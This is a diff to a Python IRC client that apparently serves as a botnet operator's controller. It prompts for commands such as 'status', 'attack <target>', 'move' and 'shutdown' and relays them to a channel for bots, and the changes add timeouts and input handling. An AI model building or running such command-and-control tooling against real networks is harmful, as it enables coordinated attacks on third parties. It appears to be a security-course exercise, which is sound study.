@@ -2,6 +2,7 @@ import argparse
 import sys
 import socket
 import time
+from termios import tcflush, TCIFLUSH
 
 class Controller_Client:
     def __init__(self, host, port, channel, secret_phrase):
@@ -17,27 +18,38 @@ class Controller_Client:
 
     def start_client(self):
         connected = self.__attempt_connection()
+        if connected:
+            self.send_to_channel("testy")
         while connected:
+            text = self.get_text()
+            self.log(text)
             # prompt user to enter a command and execute it
             command = self.__prompt_command()
             self.__send_command(command)
-            text = self.get_text()
-            self.log(text)
-            #TODO how to make while loop keep going aftet this???
+            
+            timeout = 5 # timeout (in seconds)
+            timeout_start = time.time()
+            self.log("Waiting for responses...")
+            while time.time() < timeout_start + timeout:
+                pass
 
         self.irc_socket.close()
     
     # prompts the user to enter input in order to execute command
     def __prompt_command(self):
+        tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
         return input("Please enter the command you wish to execute: ").strip()
 
     #TODO define functionality for each command 
     def __send_command(self, command):
         if command == "status":
+            self.send_to_channel("status")
             return True
-        if command == "attack":
+        if command.startswith("attack "):
+            self.send_to_channel(command)
             return True
-        if command == "move":
+        if command.startswith("move "):
+            self.send_to_channel(command)
             return True
         elif command == "quit":
             self.__terminate()
@@ -45,8 +57,7 @@ class Controller_Client:
         elif command == "shutdown":
             return True
         else:
-            self.send_to_channel("Garbage")
-            self.log("Error: Unknown command " + command)
+            self.send_to_channel(command)
             return False
             
     # Closes connection and terminates controller
@@ -96,7 +107,12 @@ class Controller_Client:
         self.irc_socket.send(message.encode())
 
     def recv_msg(self):
-        return self.irc_socket.recv(2040).decode()  #receive the text
+        self.irc_socket.settimeout(5.0)
+        try:
+            data = self.irc_socket.recv(2040).decode()  #receive the text
+        except socket.timeout:
+            return ""
+        return data 
 
     # functions to send/recv messages to channel
     def send_to_channel(self, message):
